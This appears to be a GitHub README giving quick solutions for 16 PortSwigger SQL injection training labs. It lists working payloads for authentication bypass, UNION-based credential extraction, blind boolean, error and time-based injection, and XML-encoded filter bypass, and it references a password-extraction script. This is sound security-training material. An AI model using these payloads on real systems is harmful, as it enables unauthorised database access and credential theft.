# SQL Injection Labs - Quick Reference

![Status](https://img.shields.io/badge/Status-16%20Labs%20Solved-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-orange)
![Category](https://img.shields.io/badge/Category-SQL%20Injection-blue)

> **Quick solutions and detailed writeups for PortSwigger Web Security Academy SQL Injection labs.**

---

## 📚 Table of Contents

- [Overview](#overview)
- [Automation Tools](#automation-tools)
- [Lab Solutions](#lab-solutions)
  - [Basic SQL Injection](#basic-sql-injection)
  - [UNION Attacks](#union-attacks)
  - [Blind SQL Injection](#blind-sql-injection)
  - [Advanced Techniques](#advanced-techniques)
- [Resources](#resources)

---

## Overview

This repository contains detailed writeups and quick solutions for SQL injection labs from PortSwigger Web Security Academy. Each lab demonstrates different SQL injection techniques, from basic authentication bypass to advanced time-based blind injection with automated data extraction.

### Skills Covered

✅ Basic SQL Injection  
✅ UNION-based attacks  
✅ Database enumeration  
✅ Blind SQL injection (boolean-based, error-based, time-based)  
✅ WAF bypass techniques  
✅ XML entity encoding  
✅ Automated exploitation with Python

---

## Automation Tools

### BlindSQLi.py

For labs **11, 12, 14, and 15** (Blind SQL Injection), I've created an automated Python script that handles:

- Boolean-based blind injection
- Error-based blind injection  
- Time-based blind injection with binary search
- Automatic password extraction

**Usage:**
```bash
python BlindSQLi.py
```

The script will prompt you for:
- Lab URL
- Session cookie
- Tracking ID

Then it automatically extracts the administrator password using binary search optimization. [Try it now](BlindSQLi/README.md) 

---

## Lab Solutions

### Basic SQL Injection

#### **Lab 1: Retrieve Hidden Data**
- **Difficulty:** Apprentice
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data) | [Writeup](01.%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data.md)
- **Quick Solution:**
  ```
  category=Pets' OR 1=1--
  ```
- **Technique:** Bypass WHERE clause using always-true condition

---

#### **Lab 2: Login Bypass**
- **Difficulty:** Apprentice
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-login-bypass) | [Writeup](02.%20SQL%20injection%20login%20bypass.md)
- **Quick Solution:**
  ```
  username: administrator'--
  password: (anything)
  ```
- **Technique:** Comment out password check to bypass authentication

---

### UNION Attacks

#### **Lab 3: Query Database Version (Oracle)**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle) | [Writeup](03.%20SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle.md)
- **Quick Solution:**
  ```
  category=Gifts' UNION SELECT BANNER, NULL FROM v$version--
  ```
- **Technique:** Oracle-specific version enumeration

---

#### **Lab 4: Query Database Version (MySQL/SQL Server)**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft) | [Writeup](04.%20SQL%20injection%20attack,%20querying%20database%20version%20mysql-microsoft.md)
- **Quick Solution:**
  ```
  category=Gifts' UNION SELECT @@version, NULL--
  ```
- **Technique:** MySQL/SQL Server version enumeration

---

#### **Lab 5: List Database Contents (Non-Oracle)**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle) | [Writeup](05.%20SQL%20injection%20attack,%20listing%20database%20contents%20non-oracle.md)
- **Quick Solution:**
  ```sql
  -- Find tables:
  category=Pets' UNION SELECT TABLE_NAME, NULL FROM information_schema.tables--
  
  -- Find columns:
  category=Pets' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name='users_xxxxx'--
  
  -- Extract data:
  category=Pets' UNION SELECT username || '~' || password, NULL FROM users_xxxxx--
  ```
- **Technique:** information_schema enumeration + concatenation

---

#### **Lab 6: List Database Contents (Oracle)**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle) | [Writeup](06.%20SQL%20injection%20attack,%20listing%20database%20contents%20oracle.md)
- **Quick Solution:**
  ```sql
  -- Find tables:
  category=Gifts' UNION SELECT TABLE_NAME, NULL FROM all_tables--
  
  -- Find columns:
  category=Gifts' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name='USERS_XXXXX'--
  
  -- Extract data:
  category=Gifts' UNION SELECT USERNAME_XXXXX || '~' || PASSWORD_XXXXX, NULL FROM USERS_XXXXX--
  ```
- **Technique:** Oracle all_tables/all_tab_columns enumeration

---

#### **Lab 7: Determine Number of Columns**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) | [Writeup](07.%20SQL%20injection%20UNION%20attack,%20determining%20the%20number%20of%20columns%20returned%20by%20the%20query.md)
- **Quick Solution:**
  ```
  -- Method 1 (ORDER BY):
  category=Pets' ORDER BY 3--
  category=Pets' ORDER BY 4--  (error = 3 columns)
  
  -- Method 2 (UNION SELECT):
  category=Pets' UNION SELECT NULL,NULL,NULL--
  ```
- **Technique:** Column count enumeration

---

#### **Lab 8: Find Column Containing Text**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text) | [Writeup](08.%20SQL%20injection%20UNION%20attack,%20finding%20column%20containing%20text.md)
- **Quick Solution:**
  ```
  -- Test each column:
  category=Pets' UNION SELECT 'rj68Cf', NULL, NULL--  (error)
  category=Pets' UNION SELECT NULL, 'rj68Cf', NULL--  (success = column 2)
  ```
- **Technique:** Data type compatibility testing

---

#### **Lab 9: Retrieve Data from Other Tables**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables) | [Writeup](09.%20SQL%20injection%20UNION%20attack,%20retrieving%20data%20from%20other%20tables.md)
- **Quick Solution:**
  ```
  category=Gifts' UNION SELECT username, password FROM users--
  ```
- **Technique:** Direct UNION-based credential extraction

---

#### **Lab 10: Retrieve Multiple Values in Single Column**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column) | [Writeup](10.%20SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column.md)
- **Quick Solution:**
  ```
  category=Pets' UNION SELECT NULL, username || '~' || password FROM users--
  ```
- **Technique:** String concatenation for multi-value extraction

---

### Blind SQL Injection

#### **Lab 11: Conditional Responses**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses) | [Writeup](11.%20Blind%20SQL%20injection%20with%20conditional%20responses.md)
- **Quick Solution:**
  ```
  -- Manual (character-by-character):
  Cookie: TrackingId=xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)) > 109--
  
  -- Automated (use BlindSQLi.py):
  python BlindSQLi.py
  ```
- **Technique:** Boolean-based blind injection with "Welcome back!" detection

---

#### **Lab 12: Conditional Errors**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors) | [Writeup](12.%20Blind%20SQL%20injection%20with%20conditional%20errors.md)
- **Quick Solution:**
  ```
  -- Oracle syntax:
  Cookie: TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
  
  -- Automated (use BlindSQLi.py):
  python BlindSQLi.py
  ```
- **Technique:** Error-based blind injection using division by zero

---

#### **Lab 13: Visible Error-Based**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based) | [Writeup](13.%20Visible%20error-based%20SQL%20injection.md)
- **Quick Solution:**
  ```
  Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```
- **Technique:** Direct data leakage through type conversion errors

---

#### **Lab 14: Time Delays**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays) | [Writeup](14.%20Blind%20SQL%20injection%20with%20time%20delays.md)
- **Quick Solution:**
  ```
  Cookie: TrackingId=xyz'; SELECT pg_sleep(10)--
  ```
- **Technique:** Time-based blind injection (PostgreSQL)

---

#### **Lab 15: Time Delays with Information Retrieval**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval) | [Writeup](15.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md)
- **Quick Solution:**
  ```
  -- Manual:
  Cookie: TrackingId=xyz'; SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='administrator') = 20) THEN pg_sleep(5) ELSE pg_sleep(0) END--
  
  -- Automated (use BlindSQLi.py):
  python BlindSQLi.py
  ```
- **Technique:** Automated time-based extraction with binary search

---

### Advanced Techniques

#### **Lab 16: Filter Bypass via XML Encoding**
- **Difficulty:** Practitioner
- **Link:** [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding) | [Writeup](16.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding.md)
- **Quick Solution:**
  ```xml
  <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
  ```
- **Technique:** WAF bypass using hexadecimal XML entity encoding

---

## Resources

### Cheatsheets
- [PortSwigger SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [ASCII Code Table](https://www.ascii-code.com/)

### Tools

- **Burp Suite Community/Professional** - Web proxy and testing framework  
  🔗 [Download](https://portswigger.net/burp/communitydownload) | [Documentation](https://portswigger.net/burp/documentation)

- **sqlmap** - Automated SQL injection tool  
  🔗 [Official Site](https://sqlmap.org/) | [GitHub](https://github.com/sqlmapproject/sqlmap) | [Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

- **Python 3** - For custom automation scripts  
  🔗 [Download](https://www.python.org/downloads/) | [Documentation](https://docs.python.org/3/)

- **Hackvertor** - Burp extension for encoding/decoding  
  🔗 [BApp Store](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f) | [GitHub](https://github.com/hackvertor/hackvertor)

- **BlindSQLi.py** - Custom automation script for blind SQL injection labs  
  🔗 [BlindSQLi.py](BlindSQLi/README.md)  
  *Automates labs 11, 12, 14, and 15 with binary search optimization*

### Database-Specific Syntax

| Technique | PostgreSQL/Oracle | MySQL | SQL Server |
|-----------|------------------|-------|------------|
| **Comment** | `--` | `#` or `-- ` | `--` |
| **Version** | `SELECT version()` | `SELECT @@version` | `SELECT @@version` |
| **Concatenation** | `\|\|` | `CONCAT()` | `+` |
| **Time Delay** | `pg_sleep(10)` | `SLEEP(10)` | `WAITFOR DELAY '0:0:10'` |
| **Substring** | `SUBSTR(str,1,1)` | `SUBSTRING(str,1,1)` | `SUBSTRING(str,1,1)` |

---

## 📝 Notes

- All labs are solved and documented with detailed explanations
- Python automation scripts use binary search for efficient data extraction
- Writeups include database-specific syntax variations
- Focus on understanding the concepts, not just copying payloads

---

## 🤝 Contributing

Found an error or have a better solution? Feel free to open an issue or submit a pull request!

---

## 📜 License

These writeups are for educational purposes. Please use responsibly and only on systems you have permission to test.

---

**Happy Hacking! 🔐**
